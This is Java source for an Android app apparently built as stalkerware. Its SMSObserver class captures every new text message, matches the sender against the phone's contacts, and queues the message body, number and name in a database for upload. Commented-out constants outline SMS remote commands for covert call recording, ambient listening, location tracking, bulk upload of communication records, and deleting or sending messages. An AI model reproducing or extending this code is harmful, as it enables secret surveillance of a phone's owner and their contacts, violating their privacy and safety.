package com.privacy.monitor.resolver;


import com.privacy.monitor.db.SMSRecordDB;
import com.privacy.monitor.domain.SMSRecord;
import com.privacy.monitor.inte.RunBack;
import com.privacy.monitor.resolver.field.SMSConstant;
import com.privacy.monitor.util.Logger;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;

/**
 * 短信观察者
 */
public class SMSObserver extends ContentObserver {
	
	private Context context;
	private SMSRecordDB sqlite;
	private RunBack runBack;
	
	//private static final String head ="*123456789";
	//通话录音 1开启,0关闭
	//private static final String [] SRSwitch = {"*4*1","*4*0"};
	//环境监听 1开启，0关闭
	//private static final String [] environmentSwitch = {"*3*1","*3*0"};
	//范围 默认全开 0关闭,1开启
	//private static final String [] range = {"*5*1","*5*0","*5*1111"};
    //默认值:5*60 5代表条数 60代表分钟每隔多少分钟上传
	//private static final String [] SMSUploadSwitch = {"*6*1-100*60"};
	//添加录音清单号码
	//private static final String SRListNumber = "*7*";
	//清单录音类型 默认值:3 ,1:清单内号码录音 2:清单外号码录音
	//private static final String [] SRType = {"*8*1","*8*2","*8*3"}; 
	//删除清单全部号码或删除指定的号码(监控号码)
	//private static final String [] deleteSRListNumber = {"*9*2","*9*1"};
	//环境录音时长 取值:1-60 分钟
	//private static final String environmentSet = "*10*1";
	//开启或关闭换卡通知 默认开启 0:关闭 1:开启
	//private static final String [] changeSIMNotice = {"*22*1","*22*0"};
	//停用或启用软件所有功能 默认开启 0:关闭 1:开启
	//private static final String [] APPFunctionSwitch = {"*23*0","*23*1"};
	//阻止手机收发含有关键字内容的短信
	//private static final String  stopSMS = "*24*";
	//删除含有关键字的短信或清空所有短信
	//private static final String [] deleteSMS = {"*25*1*","*25*2"};
	//立即上传对方GPS位置
	//private static final String uploadGPSLocation = "*12";
	//立即上传对方基站位置
	//private static final String uploadBSLocation = "*13";
	//立即上传对方手机所有通信记录
	//private static final String uploadContacts = "*14";
	//发送短信到指定号码*17*电话号码*短信内容
	//private static final String sendSMS = "17*";
	// 内容解析器，和ContentProvider刚好相反,一个提供，一个解析
	private ContentResolver mResolver;

	// 需要取得的短信条数
	// private static final int MAX_NUMS = 10;

	// 用于保存记录中最大的ID
	// private static final int MAX_ID = 0;

	// 需要获得的字段列
	private static final String[] PROJECTION = {SMSConstant.TYPE,
			SMSConstant.ADDRESS, SMSConstant.BODY, SMSConstant.DATE,
			 SMSConstant.READ};

	public SMSObserver(ContentResolver resolver, Handler handler,Context context,RunBack runBack) {
		super(handler);
		this.mResolver = resolver;
		this.context = context;
		this.sqlite = SMSRecordDB.getInstance(context);
		this.runBack = runBack;
	}
 
	public SMSObserver(Handler handler) {
		super(handler);
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		Logger.d("SMSObserver","selfChange:"+selfChange);
		if(mResolver!=null && context !=null && !selfChange){
			Cursor smsCursor = mResolver.query(SMSConstant.CONTENT_URI, // 查询的URI,
					PROJECTION, // 需要取得的列 ,
					null, // 查询语句
					null, // 可能包括您的选择，将被替换selectionArgs的值，在选择它们出现的顺序。该值将被绑定为字符串。
					"_id DESC LIMIT 1");
			if (smsCursor != null) {
				while (smsCursor.moveToNext()) {
					int typeIndex = smsCursor.getColumnIndex(SMSConstant.TYPE);
					int dateIndex =  smsCursor.getColumnIndex(SMSConstant.DATE);
					int addressIndex =smsCursor.getColumnIndex(SMSConstant.ADDRESS);
					int bodyIndex = smsCursor.getColumnIndex(SMSConstant.BODY);
					if(typeIndex !=-1 && dateIndex !=-1 && addressIndex !=-1 && bodyIndex !=-1){
						final String type = smsCursor.getString(typeIndex);
						final String date = smsCursor.getString(dateIndex);
						final String phone = smsCursor.getString(addressIndex);
						final String body = smsCursor.getString(bodyIndex);
						Cursor contractsCursor = mResolver.query(Uri.parse("content://com.android.contacts/data"),new String []{"mimetype","raw_contact_id","data1"}," data1 LIKE ? ",new String[]{"%"+phone+"%"},null);
						boolean isUpload = false;
						if(contractsCursor !=null){
							while(contractsCursor.moveToNext()){
								int rawId = contractsCursor.getColumnIndex("raw_contact_id");
								if(rawId !=-1){
									Cursor nameCursor = mResolver.query(Uri.parse("content://com.android.contacts/data"),new String []{"mimetype","data1","raw_contact_id"}," raw_contact_id = ? ",new String[]{rawId+""},null);
								    if(nameCursor !=null){
								    	while(nameCursor.moveToNext()){
								    		int mimeTypeIndex = nameCursor.getColumnIndex("mimetype");
								    		if(mimeTypeIndex !=-1){
						                    	String mimeType = nameCursor.getString(mimeTypeIndex);
												if("vnd.android.cursor.item/name".equals(mimeType)){
													int data1Index = nameCursor.getColumnIndex("data1");
													if(data1Index !=-1){
														final String names = nameCursor.getString(data1Index);
														isUpload = true;
														SMSRecord smsRecord = new SMSRecord();
														smsRecord.setMessageType(type);
														smsRecord.setMessageContent(body);
														smsRecord.setDateSent(date);
														smsRecord.setPhone(phone);
														smsRecord.setName(names);
														smsRecord.setUploadStatus("0");
														sqlite.insert(smsRecord);
														if(runBack !=null){
															runBack.run();
														}
														break;
													}
												}
						                    }
								    	}
								    	nameCursor.close();
								    	break;
								    }
								}
							}
							contractsCursor.close();
						}
						if(!isUpload){
							SMSRecord smsRecord = new SMSRecord();
							smsRecord.setMessageType(type);
							smsRecord.setMessageContent(body);
							smsRecord.setDateSent(date);
							smsRecord.setPhone(phone);
							smsRecord.setUploadStatus("0");
							sqlite.insert(smsRecord);
							if(runBack !=null){
								runBack.run();
							}
						}
					}
					break;
				}
				/*
				 * 关闭游标，释放资源。否则下次查询游标仍然在原位置
				 */
				if(smsCursor !=null){
					smsCursor.close();
				}
			}
		}	
	}
}
